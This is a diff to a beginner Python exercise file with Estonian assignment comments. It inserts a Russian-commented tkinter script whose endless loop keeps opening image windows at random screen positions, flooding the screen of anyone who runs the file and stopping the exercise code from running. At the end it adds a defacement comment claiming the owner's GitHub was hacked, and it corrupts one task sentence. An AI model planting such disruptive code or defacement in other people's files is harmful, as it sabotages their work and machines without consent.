@@ -4,6 +4,54 @@
 # Küsi kasutajalt sisend tema vanuse kohta ning väljasta see ekraanile:
 # “Tere, maailm! Tervitan sind Mati! Sa oled N aastat vana.”
 
+from PIL import Image
+import matplotlib.pyplot as plt
+
+# Открываем изображение из файла (например, 'photo.jpg' в той же папке, где этот скрипт)
+
+
+import time
+import tkinter as tk
+from PIL import Image, ImageTk
+import random
+
+def open_image_window(image_path, screen_width, screen_height):
+    window = tk.Toplevel()
+    window.title("Photo")
+
+    img = Image.open(image_path)
+    photo = ImageTk.PhotoImage(img)
+
+    label = tk.Label(window, image=photo)
+    label.image = photo
+    label.pack()
+
+    # Получаем размеры изображения
+    img_width, img_height = img.size
+
+    # Выбираем случайную позицию, чтобы окно целиком помещалось на экран
+    x = random.randint(0, max(0, screen_width - img_width))
+    y = random.randint(0, max(0, screen_height - img_height))
+
+    # Задаём позицию окна
+    window.geometry(f"{img_width}x{img_height}+{x}+{y}")
+
+root = tk.Tk()
+root.withdraw()
+
+image_path = "images.jpg"
+
+# Получаем размер экрана
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+
+while True:
+    open_image_window(image_path, screen_width, screen_height)
+    root.update()
+    
+
+
+
 print("Tere maailm!")
 nimi=input("Sisesta oma nimi: ").capitalize()#sisend ja ootab enterit
 print(f"Tere maailm! Tervitan sind {nimi}")
@@ -56,4 +104,6 @@ läbimõõt=ümbermõõt/pi #võib kasutada ka math raamatukogu
 print(f"Puu läbimõõt on {läbimõõt:.2f} meetrit") #.2f tähendab 2 kohta pärast koma
 
 # 5.
-# Arvutage Pythoni käsureal, kui pikk on ristkülikukujulise maatüki diagonaal, mille mõõtmed on Nm x Mm. N ja M küsi kasutajalt.
+# Arvutage Pythoni käsureal, kui pikk on ristkülikukujulise maatüki diagonaal, mille mõõtmed on Nm x Mm. N ja sdf küsi kasutajalt.
+
+# ТВОЙ ГИТХАБ БЫЛ ВЗЛОМАН, ОН ПЕРЕХОДИТ ПОД ВЛАДЕНИЕ ДЖОРДЖА ДРОИДА
